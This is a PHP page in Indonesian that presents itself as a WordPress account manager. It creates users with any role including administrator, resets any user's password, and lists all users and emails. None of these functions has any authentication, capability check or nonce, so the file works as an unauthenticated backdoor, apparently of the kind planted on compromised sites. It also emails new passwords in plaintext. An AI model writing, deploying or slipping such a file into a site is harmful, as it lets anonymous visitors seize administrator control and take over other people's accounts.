<?php
// ========== LOAD WORDPRESS ==========
require_once('wp-load.php');

// ========== KONEKSI DATABASE LANGSUNG (untuk show users) ==========
global $wpdb;
$table_prefix = $wpdb->prefix;

// Variabel untuk pesan
$message = '';
$message_type = '';

// ========== FUNGSI 1: CREATE AKUN ==========
if (isset($_POST['create_account'])) {
    $username = sanitize_user($_POST['username']);
    $email = sanitize_email($_POST['email']);
    $password = $_POST['password'];
    $role = $_POST['role'];
    $first_name = sanitize_text_field($_POST['first_name']);
    $last_name = sanitize_text_field($_POST['last_name']);
    
    // Validasi
    if (empty($username) || empty($email) || empty($password)) {
        $message = "Semua field harus diisi!";
        $message_type = 'error';
    } elseif (!is_email($email)) {
        $message = "Email tidak valid!";
        $message_type = 'error';
    } elseif (username_exists($username)) {
        $message = "Username sudah terdaftar!";
        $message_type = 'error';
    } elseif (email_exists($email)) {
        $message = "Email sudah terdaftar!";
        $message_type = 'error';
    } else {
        // Siapkan data user
        $user_data = array(
            'user_login'    => $username,
            'user_pass'     => $password,
            'user_email'    => $email,
            'display_name'  => trim($first_name . ' ' . $last_name) ?: $username,
            'first_name'    => $first_name,
            'last_name'     => $last_name,
            'role'          => $role
        );
        
        $user_id = wp_insert_user($user_data);
        
        if (!is_wp_error($user_id)) {
            // Kirim email notifikasi
            $to = $email;
            $subject = 'Akun WordPress Anda Telah Dibuat';
            $body = "Halo $username,\n\n";
            $body .= "Akun WordPress Anda telah berhasil dibuat.\n";
            $body .= "Username: $username\n";
            $body .= "Password: $password\n";
            $body .= "Role: $role\n\n";
            $body .= "Login di: " . get_site_url() . "/wp-admin\n";
            $body .= "Terima kasih.";
            
            wp_mail($to, $subject, $body);
            
            $message = "Akun berhasil dibuat! ID: $user_id";
            $message_type = 'success';
        } else {
            $message = "Gagal membuat akun: " . $user_id->get_error_message();
            $message_type = 'error';
        }
    }
}

// ========== FUNGSI 2: RESET PASSWORD ==========
if (isset($_POST['reset_password'])) {
    $reset_username = sanitize_user($_POST['reset_username']);
    $new_password = $_POST['new_password'];
    $confirm_password = $_POST['confirm_password'];
    
    // Validasi
    if (empty($reset_username) || empty($new_password) || empty($confirm_password)) {
        $message = "Semua field harus diisi!";
        $message_type = 'error';
    } elseif ($new_password !== $confirm_password) {
        $message = "Password dan konfirmasi password tidak cocok!";
        $message_type = 'error';
    } elseif (strlen($new_password) < 6) {
        $message = "Password minimal 6 karakter!";
        $message_type = 'error';
    } else {
        // Cek user
        $user = get_user_by('login', $reset_username);
        
        if (!$user) {
            $message = "Username tidak ditemukan!";
            $message_type = 'error';
        } else {
            // Reset password
            wp_set_password($new_password, $user->ID);
            
            // Kirim email notifikasi
            $to = $user->user_email;
            $subject = 'Password WordPress Anda Telah Direset';
            $body = "Halo " . $user->display_name . ",\n\n";
            $body .= "Password Anda telah berhasil direset.\n";
            $body .= "Username: $reset_username\n";
            $body .= "Password baru: $new_password\n\n";
            $body .= "Login di: " . get_site_url() . "/wp-admin\n";
            $body .= "Segera ganti password Anda setelah login untuk keamanan.\n";
            $body .= "Terima kasih.";
            
            wp_mail($to, $subject, $body);
            
            $message = "Password berhasil direset untuk user: $reset_username";
            $message_type = 'success';
        }
    }
}

// ========== FUNGSI 3: SHOW / LIST USER ==========
// Mengambil data user langsung dari database (tanpa fungsi WordPress)
function get_all_users_direct() {
    global $wpdb;
    $table_prefix = $wpdb->prefix;
    
    // Koneksi langsung ke database
    $mysqli = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
    
    if ($mysqli->connect_error) {
        return array('error' => 'Koneksi database gagal: ' . $mysqli->connect_error);
    }
    
    $table_name = $table_prefix . 'users';
    $sql = "SELECT ID, user_login, user_email, user_registered, display_name FROM $table_name ORDER BY ID DESC";
    $result = $mysqli->query($sql);
    
    $users = array();
    if ($result && $result->num_rows > 0) {
        while($row = $result->fetch_assoc()) {
            $users[] = $row;
        }
    }
    
    $mysqli->close();
    return $users;
}

// Atau menggunakan fungsi WordPress (lebih aman)
function get_all_users_wp() {
    $users = get_users(array(
        'orderby' => 'ID',
        'order' => 'DESC'
    ));
    return $users;
}

// Pilih metode yang ingin digunakan (saya pakai keduanya sebagai backup)
$users_direct = get_all_users_direct();
$users_wp = get_all_users_wp();

?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Manajemen Akun WordPress - 3 in 1</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #f0f2f5;
            padding: 20px;
        }
        .container {
            max-width: 1100px;
            margin: 0 auto;
        }
        h1 {
            text-align: center;
            color: #1e293b;
            margin-bottom: 30px;
            font-size: 28px;
        }
        .tabs {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .tab-btn {
            flex: 1;
            padding: 12px 20px;
            background: #e2e8f0;
            border: none;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            color: #475569;
            min-width: 120px;
        }
        .tab-btn:hover {
            background: #cbd5e1;
            transform: translateY(-2px);
        }
        .tab-btn.active {
            background: #3b82f6;
            color: white;
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
        }
        .tab-content {
            display: none;
            background: white;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            animation: fadeIn 0.3s;
        }
        .tab-content.active {
            display: block;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            font-weight: 600;
            margin-bottom: 6px;
            color: #334155;
            font-size: 14px;
        }
        input, select {
            width: 100%;
            padding: 10px 12px;
            border: 2px solid #e2e8f0;
            border-radius: 8px;
            font-size: 14px;
            transition: border-color 0.3s;
        }
        input:focus, select:focus {
            outline: none;
            border-color: #3b82f6;
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
        }
        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }
        .btn-submit {
            width: 100%;
            padding: 12px;
            background: #3b82f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        .btn-submit:hover {
            background: #2563eb;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
        }
        .btn-submit.reset-btn {
            background: #f59e0b;
        }
        .btn-submit.reset-btn:hover {
            background: #d97706;
            box-shadow: 0 4px 12px rgba(245, 158, 11, 0.3);
        }
        .btn-submit.show-btn {
            background: #10b981;
        }
        .btn-submit.show-btn:hover {
            background: #059669;
            box-shadow: 0 4px 12px rgba(16, 185, 129, 0.3);
        }
        .message {
            padding: 12px 16px;
            border-radius: 8px;
            margin-bottom: 20px;
            font-weight: 500;
        }
        .message.success {
            background: #d1fae5;
            color: #065f46;
            border: 1px solid #34d399;
        }
        .message.error {
            background: #fee2e2;
            color: #991b1b;
            border: 1px solid #f87171;
        }
        .info-box {
            background: #eff6ff;
            border-left: 4px solid #3b82f6;
            padding: 12px 16px;
            border-radius: 4px;
            margin-top: 15px;
            color: #1e40af;
            font-size: 14px;
        }
        .info-box strong {
            display: block;
            margin-bottom: 5px;
        }
        .user-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
        }
        .user-table th {
            background: #f8fafc;
            color: #1e293b;
            font-weight: 600;
            padding: 12px;
            text-align: left;
            border-bottom: 2px solid #e2e8f0;
        }
        .user-table td {
            padding: 10px 12px;
            border-bottom: 1px solid #e2e8f0;
        }
        .user-table tr:hover {
            background: #f8fafc;
        }
        .badge {
            display: inline-block;
            padding: 3px 10px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
            background: #e2e8f0;
            color: #475569;
        }
        .badge.admin {
            background: #fee2e2;
            color: #991b1b;
        }
        .badge.editor {
            background: #dbeafe;
            color: #1e40af;
        }
        .badge.author {
            background: #d1fae5;
            color: #065f46;
        }
        .badge.contributor {
            background: #fef3c7;
            color: #92400e;
        }
        .badge.subscriber {
            background: #e2e8f0;
            color: #475569;
        }
        .stats {
            display: flex;
            gap: 20px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .stat-box {
            background: #f8fafc;
            padding: 15px 20px;
            border-radius: 8px;
            flex: 1;
            min-width: 150px;
        }
        .stat-box .number {
            font-size: 24px;
            font-weight: 700;
            color: #1e293b;
        }
        .stat-box .label {
            font-size: 14px;
            color: #64748b;
        }
        .action-btn {
            padding: 4px 12px;
            border-radius: 4px;
            font-size: 12px;
            border: none;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.2s;
            text-decoration: none;
            display: inline-block;
        }
        .action-btn.edit {
            background: #dbeafe;
            color: #1e40af;
        }
        .action-btn.edit:hover {
            background: #bfdbfe;
        }
        @media (max-width: 640px) {
            .form-row {
                grid-template-columns: 1fr;
                gap: 0;
            }
            .tab-btn {
                font-size: 13px;
                padding: 10px;
                min-width: 80px;
            }
            .tab-content {
                padding: 20px;
            }
            .user-table {
                font-size: 13px;
            }
            .user-table th, .user-table td {
                padding: 8px;
            }
            .stats {
                flex-direction: column;
            }
        }
        .search-box {
            margin-bottom: 15px;
        }
        .search-box input {
            max-width: 300px;
        }
        .table-wrapper {
            overflow-x: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 Manajemen Akun WordPress</h1>
        
        <?php if ($message): ?>
            <div class="message <?php echo $message_type; ?>">
                <?php echo $message; ?>
            </div>
        <?php endif; ?>
        
        <!-- Tabs -->
        <div class="tabs">
            <button class="tab-btn active" onclick="switchTab('create')">➕ Create Akun</button>
            <button class="tab-btn" onclick="switchTab('reset')">🔑 Reset Password</button>
            <button class="tab-btn" onclick="switchTab('show')">📋 Lihat User</button>
        </div>
        
        <!-- ========== TAB 1: CREATE AKUN ========== -->
        <div id="tab-create" class="tab-content active">
            <h2 style="color: #1e293b; margin-bottom: 20px;">Buat Akun Baru</h2>
            <form method="POST">
                <div class="form-row">
                    <div class="form-group">
                        <label>Username *</label>
                        <input type="text" name="username" placeholder="Masukkan username" required>
                    </div>
                    <div class="form-group">
                        <label>Email *</label>
                        <input type="email" name="email" placeholder="email@domain.com" required>
                    </div>
                </div>
                
                <div class="form-group">
                    <label>Password *</label>
                    <input type="password" name="password" placeholder="Minimal 6 karakter" required>
                </div>
                
                <div class="form-row">
                    <div class="form-group">
                        <label>Nama Depan</label>
                        <input type="text" name="first_name" placeholder="Nama depan">
                    </div>
                    <div class="form-group">
                        <label>Nama Belakang</label>
                        <input type="text" name="last_name" placeholder="Nama belakang">
                    </div>
                </div>
                
                <div class="form-group">
                    <label>Role / Hak Akses</label>
                    <select name="role">
                        <option value="subscriber">Subscriber</option>
                        <option value="contributor">Contributor</option>
                        <option value="author">Author</option>
                        <option value="editor">Editor</option>
                        <option value="administrator">Administrator</option>
                    </select>
                </div>
                
                <button type="submit" name="create_account" class="btn-submit">
                    ✨ Buat Akun
                </button>
                
                <div class="info-box">
                    <strong>📌 Informasi:</strong>
                    <ul style="margin-left: 20px; margin-top: 5px;">
                        <li>Username dan Email harus unik (belum terdaftar)</li>
                        <li>Email notifikasi akan dikirim ke pengguna</li>
                        <li>Role menentukan hak akses di dashboard</li>
                    </ul>
                </div>
            </form>
        </div>
        
        <!-- ========== TAB 2: RESET PASSWORD ========== -->
        <div id="tab-reset" class="tab-content">
            <h2 style="color: #1e293b; margin-bottom: 20px;">Reset Password</h2>
            <form method="POST">
                <div class="form-group">
                    <label>Username *</label>
                    <input type="text" name="reset_username" placeholder="Masukkan username yang akan direset" required>
                </div>
                
                <div class="form-group">
                    <label>Password Baru *</label>
                    <input type="password" name="new_password" placeholder="Minimal 6 karakter" required>
                </div>
                
                <div class="form-group">
                    <label>Konfirmasi Password Baru *</label>
                    <input type="password" name="confirm_password" placeholder="Ulangi password" required>
                </div>
                
                <button type="submit" name="reset_password" class="btn-submit reset-btn">
                    🔄 Reset Password
                </button>
                
                <div class="info-box" style="border-left-color: #f59e0b; background: #fffbeb; color: #92400e;">
                    <strong>⚠️ Peringatan:</strong>
                    <ul style="margin-left: 20px; margin-top: 5px;">
                        <li>Password akan direset tanpa verifikasi lama</li>
                        <li>Email notifikasi akan dikirim ke pengguna</li>
                        <li>Segera ganti password setelah login untuk keamanan</li>
                    </ul>
                </div>
            </form>
        </div>
        
        <!-- ========== TAB 3: SHOW / LIST USER ========== -->
        <div id="tab-show" class="tab-content">
            <h2 style="color: #1e293b; margin-bottom: 20px;">📋 Daftar User WordPress</h2>
            
            <!-- Stats -->
            <div class="stats">
                <div class="stat-box">
                    <div class="number"><?php echo count($users_wp); ?></div>
                    <div class="label">Total User</div>
                </div>
                <div class="stat-box">
                    <div class="number">
                        <?php 
                        $admin_count = 0;
                        foreach($users_wp as $user) {
                            if (in_array('administrator', $user->roles)) $admin_count++;
                        }
                        echo $admin_count;
                        ?>
                    </div>
                    <div class="label">Administrator</div>
                </div>
                <div class="stat-box">
                    <div class="number">
                        <?php 
                        $subscriber_count = 0;
                        foreach($users_wp as $user) {
                            if (in_array('subscriber', $user->roles)) $subscriber_count++;
                        }
                        echo $subscriber_count;
                        ?>
                    </div>
                    <div class="label">Subscriber</div>
                </div>
            </div>
            
            <!-- Search -->
            <div class="search-box">
                <input type="text" id="searchUser" placeholder="🔍 Cari username atau email..." onkeyup="filterTable()">
            </div>
            
            <!-- Tabel User - Versi 1: Menggunakan fungsi WordPress -->
            <h3 style="color: #64748b; font-size: 14px; margin-bottom: 10px;">Data dari WordPress (wp_get_users)</h3>
            <div class="table-wrapper">
                <table class="user-table" id="userTable">
                    <thead>
                        <tr>
                            <th>ID</th>
                            <th>Username</th>
                            <th>Email</th>
                            <th>Display Name</th>
                            <th>Role</th>
                            <th>Terdaftar</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if (!empty($users_wp)): ?>
                            <?php foreach($users_wp as $user): ?>
                                <tr>
                                    <td><?php echo $user->ID; ?></td>
                                    <td><strong><?php echo esc_html($user->user_login); ?></strong></td>
                                    <td><?php echo esc_html($user->user_email); ?></td>
                                    <td><?php echo esc_html($user->display_name); ?></td>
                                    <td>
                                        <?php 
                                        $roles = $user->roles;
                                        $role_display = !empty($roles) ? $roles[0] : 'no role';
                                        $role_class = strtolower($role_display);
                                        ?>
                                        <span class="badge <?php echo $role_class; ?>">
                                            <?php echo ucfirst($role_display); ?>
                                        </span>
                                    </td>
                                    <td><?php echo date('d M Y H:i', strtotime($user->user_registered)); ?></td>
                                </tr>
                            <?php endforeach; ?>
                        <?php else: ?>
                            <tr>
                                <td colspan="6" style="text-align: center; padding: 30px; color: #94a3b8;">
                                    Tidak ada user ditemukan
                                </td>
                            </tr>
                        <?php endif; ?>
                    </tbody>
                </table>
            </div>
            
            <!-- Tabel User - Versi 2: Menggunakan query langsung (alternatif) -->
            <h3 style="color: #64748b; font-size: 14px; margin-top: 30px; margin-bottom: 10px;">
                Data dari Database (Query Langsung) 
                <?php if (isset($users_direct['error'])): ?>
                    <span style="color: #ef4444; font-size: 12px;">- Error: <?php echo $users_direct['error']; ?></span>
                <?php endif; ?>
            </h3>
            <?php if (!isset($users_direct['error'])): ?>
                <div class="table-wrapper">
                    <table class="user-table">
                        <thead>
                            <tr>
                                <th>ID</th>
                                <th>Username</th>
                                <th>Email</th>
                                <th>Display Name</th>
                                <th>Terdaftar</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php if (!empty($users_direct)): ?>
                                <?php foreach($users_direct as $user): ?>
                                    <tr>
                                        <td><?php echo $user['ID']; ?></td>
                                        <td><strong><?php echo esc_html($user['user_login']); ?></strong></td>
                                        <td><?php echo esc_html($user['user_email']); ?></td>
                                        <td><?php echo esc_html($user['display_name']); ?></td>
                                        <td><?php echo date('d M Y H:i', strtotime($user['user_registered'])); ?></td>
                                    </tr>
                                <?php endforeach; ?>
                            <?php else: ?>
                                <tr>
                                    <td colspan="5" style="text-align: center; padding: 30px; color: #94a3b8;">
                                        Tidak ada user ditemukan
                                    </td>
                                </tr>
                            <?php endif; ?>
                        </tbody>
                    </table>
                </div>
            <?php endif; ?>
            
            <div class="info-box" style="border-left-color: #10b981; background: #ecfdf5; color: #065f46;">
                <strong>📊 Informasi:</strong>
                <ul style="margin-left: 20px; margin-top: 5px;">
                    <li>Menampilkan semua user yang terdaftar di WordPress</li>
                    <li>Ada 2 metode: via fungsi WordPress dan query langsung</li>
                    <li>Gunakan fitur search untuk mencari user</li>
                </ul>
            </div>
        </div>
    </div>
    
    <script>
        // ========== TAB SWITCHING ==========
        function switchTab(tab) {
            // Sembunyikan semua tab
            document.querySelectorAll('.tab-content').forEach(el => {
                el.classList.remove('active');
            });
            
            // Nonaktifkan semua tombol
            document.querySelectorAll('.tab-btn').forEach(el => {
                el.classList.remove('active');
            });
            
            // Tampilkan tab yang dipilih
            document.getElementById('tab-' + tab).classList.add('active');
            
            // Aktifkan tombol yang dipilih
            event.target.classList.add('active');
        }
        
        // ========== SEARCH / FILTER TABLE ==========
        function filterTable() {
            const input = document.getElementById('searchUser');
            const filter = input.value.toLowerCase();
            const table = document.getElementById('userTable');
            const rows = table.getElementsByTagName('tr');
            
            // Loop melalui semua baris (skip header)
            for (let i = 1; i < rows.length; i++) {
                const row = rows[i];
                const cells = row.getElementsByTagName('td');
                let found = false;
                
                // Cek di kolom username (index 1) dan email (index 2)
                if (cells.length > 0) {
                    const username = cells[1]?.textContent?.toLowerCase() || '';
                    const email = cells[2]?.textContent?.toLowerCase() || '';
                    const displayName = cells[3]?.textContent?.toLowerCase() || '';
                    
                    if (username.includes(filter) || email.includes(filter) || displayName.includes(filter)) {
                        found = true;
                    }
                }
                
                row.style.display = found ? '' : 'none';
            }
        }
    </script>
</body>
</html>
